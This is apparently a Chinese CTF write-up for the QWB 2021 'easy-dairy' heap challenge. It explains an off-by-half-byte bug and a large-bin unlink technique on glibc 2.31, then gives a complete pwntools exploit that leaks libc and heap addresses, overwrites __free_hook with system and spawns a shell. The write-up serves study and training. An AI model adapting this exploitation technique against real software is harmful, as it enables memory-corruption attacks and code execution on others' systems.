---
title: easy-dairy
date: 2021-07-02 14:53:19
tags: 
---
easy-dairy qwb 2021
<!--more-->
# Ana

`libc version` == 2.31

漏洞点：

1. add会比输入的size大一个字节之后会补零，之后会往内容后面多半个字节写一个`checksum`(暂且称之为`offby0.5`)
2. `show`的时候会检查`checksum`不过写的有些问题用的是`&1`所以一半可能性能`show`出来（虽然`index`和`ptr`和`size`会被检查）

虽然做完之后感觉也没啥，但是这种利用`large bin`的方式很巧妙值得一篇单独的wp。

# Solution

本题之中开始时能用的上的只有 `offby0.5`,不能控制`size`大小所以只能控制`inuse`，这时候只能走`unlink`。因为`unlink`会检查 `fd→bk` 和`bk→fd`，但是没有泄漏，所以需要借助已有的地址，至于为什么要用`largin bin`因为`large bin`可以直接提供两个指向自己的`heap`指针且恰好可以设计size=presize（其实我是马后炮，我是看了队友给出的一篇[文章][1]发现2.29没泄漏走`large bin`比较快）。

一个`large bin`一般长这样，我们构造我们的fake chunk 再`large bin +0x10`处，将`bk`改成`size`，使其等于`persize`，`presize`自己算，恰好把`fake` `chunk`给`unlink`掉。

```bash
large bin (splited):
--------------------------------
presize       size
--------------------------------
fd            bk
--------------------------------
fd_nextsize   bk_nextsize
--------------------------------
unsorted bin
...
--------------------------------
attack chunk:(which offby0.5/with a fake presize)
--------------------------------
victim: (which would consolidate backforward)
...
--------------------------------
```

我们的写指针从`fd`开始写，当只有一个`large bin`的时候`nextsize`指针都指向自己，这是个优势我们如果要满足`unlink`只需要

1. `presize` = `large bin` +0x10
2. `fd` = `bk`-0x8
3. `size` = `pre_size`

通过以下手段满足：

1. 用`fastbin chain`（`tcache` 的话`key`会覆盖掉`fake chunk`的`size`）来放一个`heap`地址之后`partial` `write`掉指向`fake chunk`
2. `fd`可以`partial write`最后一个字节，倒数第二字节需要碰运气恰好为00（当然最后1.5字节要自己调成0，此处需要1/16的概率），之后程序会改掉2.5字节所以再需要1/16的概率。

这样只要设置好 `attack chunk`的 `fake presize`之后`free` 掉 `attack chunk` 就可以`overlap` `unsorted bin`，接下来就是常规操作了。

# EXP(1/256)

```python
from pwn import *
context.arch='amd64'
def cmd(c):
    p.sendlineafter(">> ",str(c))
def add(size,c='A\n'):
    cmd(1)
    p.sendlineafter(": ",str(size-1))
    p.sendafter(": ",c)
def free(c):
    cmd(3)
    p.sendlineafter(": ",str(c))
def show(c):
    cmd(2)
    p.sendlineafter(": ",str(c))
p=process("./pwn")
#context.log_level='debug'
add(0xd60)#0
add(0x6f8+0x20)#1
add(0x208)#2
add(0x488)#3
add(0x28)#4
free(1)
add(0xAAA)#1
add(0x18,"A\n")#5
add(0xAAA)#6
add(0x28,p64(1+0xd)+p64(0x901)+b'\x18'+b'\n')#7
for x in range(8,8+8):
    add(0x28)
for x in range(8,8+8):
    free(x)
free(7)
for x in range(7,7+7):
    add(0x28)
add(0x28,'\x30\n')#14
free(2)
add(0x208,'\0'*0x207)#2
free(2)
add(0x208,'\0'*0x1ff+'\x09'+'\n')#2
# context.terminal=['tmux','split']
# gdb.attach(p,'''
# set *0x55555555a040=0x000055555555a018
# set *0x000055555555a030=0x000055555555a030
# q
# ''')
context.terminal=['tmux','split','-h']
free(3)
add(0x548)#3
context.log_level='debug'
add(0x28,'A'*0x16+'\n')#15
add(0x160)#16
#raw_input()
show(15)
p.readuntil(": ")
base=u64(p.readline()[:-1]+b'\0\0')-(0x7f83ef52dbe0-0x7f83ef342000)
log.warning(hex(base))
#gdb.attach(p)
add(0x28)#17
add(0x28)#18
add(0x28)#19
add(0x28)#20
for x in range(7,7+6):
    free(x)
free(18)
free(20)
free(15)
show(17)
p.readuntil(": ")
heap=u64(p.readline()[:-1]+b'\0\0')-0x1230
log.warning(hex(heap))
free(19)
free(17)
for x in range(7,7+6):
    add(0x28)
add(0x28)#15
add(0x28,p64(base+0x1eeb28)+b'\n')#17 - > free hook 
add(0x28,'/bin/sh\0\n')#18
add(0x28)#19
add(0x28,p64(base+0x55410)+b'\n')#20
#gdb.attach(p,'b free')
free(18)
p.interactive()
```

# 总结

利用`large bin`的结构`partial write`来满足`unlink`的思路是很骚了。

即使是末尾补0，无泄露也挡不住`0ffby0.5`，这题挺有意思的。

[1]: https://www.anquanke.com/post/id/236078?ivk_sa=1024320u#h3-14